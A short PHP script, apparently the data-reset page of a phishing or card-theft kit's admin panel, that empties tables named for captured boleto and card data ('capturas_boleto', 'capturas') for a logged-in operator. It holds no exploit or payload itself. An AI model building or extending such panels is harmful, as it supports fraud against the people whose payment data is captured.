<?php
ob_start();
session_start();
error_reporting(0);
ini_set(“display_errors”, 0 );


$ID_A = $_GET ['metod'];

$ID =  addslashes($ID_A);
	


if(isset($_SESSION['login_user']))
	{


require_once ("config.php");
require_once ("conexao.php");


if ($ID == "leto") {


   $sql = "TRUNCATE TABLE capturas_boleto";
   $query = $mysqli->query($sql);

  if(!$query)
    die (header("Location: ../info.php?reset=2"));
  else
    echo (header("Location: ../info.php?reset=1"));



}else if ($ID == "cc"){


   $sql = "TRUNCATE TABLE capturas";
   $query = $mysqli->query($sql);

  if(!$query)
    die (header("Location: ../info.php?reset=2"));
  else
    echo (header("Location: ../info.php?reset=1"));

		
		
}
		
	}	
		
?>

